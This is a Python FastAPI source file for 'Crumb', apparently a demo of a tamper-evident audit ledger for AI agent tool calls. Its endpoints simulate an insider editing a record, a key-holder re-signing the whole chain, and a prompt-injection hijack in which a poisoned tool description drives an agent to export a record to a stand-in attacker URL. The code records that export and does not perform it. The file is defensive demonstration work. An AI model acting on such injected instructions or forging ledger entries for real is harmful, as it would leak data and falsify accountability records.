"""
Crumb web — the timeline view (P4).

One small FastAPI app, no build step. It serves a self-contained HTML timeline
and a thin JSON API over the same ledger the CLI writes. The page lets a visitor
seed a few crumbs, then TAMPER one and watch verification flip from VERIFIED to
MISMATCH live — the P2 money shot, in a browser.

Run: uvicorn crumb.web:app --host 127.0.0.1 --port 8730
"""

from __future__ import annotations

import hashlib
import json
import os
from pathlib import Path

from cryptography.hazmat.primitives import serialization
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse, Response

from . import anchor, auth
from .agent import ToolCall
from .gateway import Gateway
from .ledger import Ledger, canonical
from .verify import verify_ledger

LEDGER = "data/ledger.jsonl"
KEY = "data/ledger.key"
PUB = "data/ledger.pub"
ANCHORS = "data/anchors.jsonl"
ATTACK_LEDGER = "data/attack_ledger.jsonl"  # isolated — the hijack demo never touches the main ledger
ATTACKER_DEST = "https://exfil.attacker.example/collect"
HERE = Path(__file__).parent
AGENT_ID = "crumb-agent-1"

# A realistic mix: two humans, both transports, one denied call. Timestamps are
# FIXED so the seed is deterministic — re-seeding reproduces identical crumbs, so
# the Merkle root (and its Rekor anchor) stays valid across restores.
_SEED = [
    ("alice", "openai", 42, "2026-06-20T12:00:00+00:00"),
    ("bob", "mcp", 43, "2026-06-20T12:01:00+00:00"),
    ("carol", "openai", 42, "2026-06-20T12:02:00+00:00"),
    ("alice", "mcp", 99, "2026-06-20T12:03:00+00:00"),   # record 99 missing → denied
    ("bob", "openai", 43, "2026-06-20T12:04:00+00:00"),
]

app = FastAPI(title="Crumb", docs_url=None, redoc_url=None)


def _gateway() -> Gateway:
    return Gateway(ledger=Ledger(path=LEDGER, key_path=KEY), agent_id=AGENT_ID)


def _seed() -> None:
    gw = _gateway()
    gw.ledger.reset()
    for who, transport, record_id, ts in _SEED:
        session = auth.login(who, directives=("read_record",))
        call = ToolCall(name="read_record", arguments={"record_id": record_id})
        gw.dispatch(session, call, transport=transport, ts=ts)


def _read_ledger() -> list[dict]:
    p = Path(LEDGER)
    if not p.exists():
        return []
    return [json.loads(ln) for ln in p.read_text().splitlines() if ln.strip()]


@app.on_event("startup")
def _startup() -> None:
    # Every (re)start comes up clean: deterministic ledger + one fresh anchor.
    Path(ANCHORS).unlink(missing_ok=True)
    _seed()
    anchor.checkpoint("2026-06-20T12:05:00+00:00")  # publishes the root to Rekor


@app.get("/", response_class=HTMLResponse)
def index() -> str:
    # Self-heal the public landing state. The demo mutates a SHARED on-disk ledger
    # (any visitor can click Tamper/Rollback), so without this one tamper leaves the
    # live site stuck on a red MISMATCH for every visitor after. The seed is
    # deterministic, so reseeding reproduces the exact Merkle root anchored at
    # startup — both the chain and the anchor come back VERIFIED. Every fresh load
    # starts clean; the buttons still let a visitor break it on purpose.
    _seed()
    return (HERE / "static" / "index.html").read_text()


@app.get("/favicon.ico")
def favicon() -> Response:
    return Response(status_code=204)


@app.get("/icon.svg")
def icon_svg() -> Response:
    return Response((HERE / "static" / "icon.svg").read_bytes(), media_type="image/svg+xml")


@app.get("/icon-180.png")
def icon_png() -> Response:
    return Response((HERE / "static" / "icon-180.png").read_bytes(), media_type="image/png")


@app.get("/og.png")
def og_png() -> Response:
    return Response((HERE / "static" / "og.png").read_bytes(), media_type="image/png")


@app.get("/api/ledger")
def api_ledger() -> JSONResponse:
    return JSONResponse({"entries": _read_ledger()})


@app.get("/api/verify")
def api_verify() -> JSONResponse:
    r = verify_ledger(LEDGER, PUB)
    return JSONResponse({"ok": r.ok, "checked": r.checked, "issues": r.issues})


@app.post("/api/demo/seed")
def api_seed() -> JSONResponse:
    _seed()
    return api_ledger()


@app.post("/api/demo/tamper")
def api_tamper() -> JSONResponse:
    """Edit a past crumb the way an insider would — reassign someone else's
    access to themselves. The data changes; the math won't. verify catches it."""
    lines = Path(LEDGER).read_text().splitlines()
    target = next((i for i, ln in enumerate(lines)
                   if json.loads(ln)["actor_identity"] == "bob"), None)
    if target is None:
        return JSONResponse({"tampered": None})
    rec = json.loads(lines[target])
    original = rec["actor_identity"]
    rec["actor_identity"] = "alice"  # frame alice for bob's access
    lines[target] = json.dumps(rec)
    Path(LEDGER).write_text("\n".join(lines) + "\n")
    return JSONResponse({"tampered": rec["seq"], "from": original, "to": "alice"})


@app.get("/api/anchor")
def api_anchor() -> JSONResponse:
    """Anchor status: does the current ledger still match the root we published?"""
    v = anchor.verify_anchors(LEDGER, ANCHORS)
    latest = (anchor.read_anchors(ANCHORS) or [{}])[-1]
    rk = latest.get("rekor", {})
    return JSONResponse({**v, "rekor_url": rk.get("url"), "logIndex": rk.get("logIndex")})


@app.get("/api/idp")
def api_idp() -> JSONResponse:
    """Live proof of the bind (P3b): run a real RFC 8693 token exchange against
    the IdP and verify the result against its published JWKS — decoded here so a
    visitor sees an actual provider-signed token, not a claim about one.

    Deliberately isolated from the timeline: it hits the IdP directly and degrades
    to {available:false} if the provider is down, so the page never depends on it."""
    import jwt

    from . import tokens

    idp = os.environ.get("CRUMB_IDP_URL", "http://127.0.0.1:8732").rstrip("/")
    try:
        session = auth.login("alice", directives=("read_record",))
        token = tokens.exchange_delegation(
            session.token, agent_id="support-agent", resource="read_record", idp_url=idp
        )
        header = jwt.get_unverified_header(token)
        key = jwt.PyJWKClient(f"{idp}/jwks").get_signing_key_from_jwt(token).key
        claims = jwt.decode(token, key, algorithms=["RS256"], audience="read_record")
        return JSONResponse({
            "available": True,
            "alg": header["alg"],
            "kid": header.get("kid"),
            "iss": claims["iss"],
            "sub": claims["sub"],
            "act": claims["act"]["sub"],
            "aud": claims["aud"],
            "verified": True,
        })
    except Exception as exc:
        return JSONResponse({"available": False, "reason": type(exc).__name__})


@app.post("/api/demo/rollback")
def api_rollback() -> JSONResponse:
    """The key-holder's attack: rewrite a crumb, then re-chain and re-sign EVERY
    entry. The chain verifies clean afterward — only the anchor catches it."""
    key = serialization.load_pem_private_key(Path(KEY).read_bytes(), password=None)
    rows = [json.loads(ln) for ln in Path(LEDGER).read_text().splitlines() if ln.strip()]
    target = next((i for i, r in enumerate(rows) if r["actor_identity"] == "bob"), None)
    if target is None:
        return JSONResponse({"rolledBack": None})
    rows[target]["actor_identity"] = "alice"
    prev = "0" * 64
    for r in rows:
        core = {k: v for k, v in r.items() if k not in ("entry_hash", "signature")}
        core["prev_hash"] = prev
        eh = hashlib.sha256(canonical(core)).hexdigest()
        r.clear(); r.update(core)
        r["entry_hash"] = eh
        r["signature"] = "ed25519:" + key.sign(eh.encode()).hex()
        prev = eh
    Path(LEDGER).write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    return JSONResponse({"rolledBack": rows[target]["seq"]})


@app.get("/api/demo/hijack")
def api_hijack() -> JSONResponse:
    """The attack Crumb is built to catch (run #1, FINDING.md). A poisoned tool
    description drives the agent into an export the human never authorized. We replay
    the observed hijacked call sequence through the REAL gateway, on an ISOLATED
    ledger so the main VERIFIED+anchored demo is untouched, and return what the
    ledger does about it: the rogue export lands flagged 'unauthorized' (directive
    null), pinned on the agent, never on alice. Deterministic, no API key, no real
    exfil — the export is recorded, not performed."""
    from .agent import ToolCall
    from .verify import find_unauthorized, verify_ledger

    session = auth.login("alice", directives=("read_record",))
    ledger = Ledger(path=ATTACK_LEDGER, key_path=KEY)
    ledger.reset()
    gw = Gateway(ledger=ledger, agent_id="tracer-agent-v2")
    sequence = [
        ToolCall(name="read_record", arguments={"record_id": 42}),
        ToolCall(name="export_record", arguments={"record_id": 42, "destination": ATTACKER_DEST}),
    ]
    rows = []
    for call in sequence:
        rec = gw.dispatch(session, call).record
        rows.append({k: rec[k] for k in
                     ("action", "resource_id", "directive", "on_behalf_assertion", "outcome")})

    rogue = find_unauthorized(ATTACK_LEDGER)
    report = verify_ledger(ATTACK_LEDGER, PUB)
    return JSONResponse({
        "directives": list(session.directives),
        "agent_id": "tracer-agent-v2",
        "attacker_dest": ATTACKER_DEST,
        "rows": rows,
        "unauthorized": [{"action": c["action"], "agent_id": c["agent_id"],
                          "actor_identity": c["actor_identity"],
                          "destination": (c.get("resource_id") or {}).get("destination")}
                         for c in rogue],
        "verify": {"ok": report.ok, "checked": report.checked},
    })
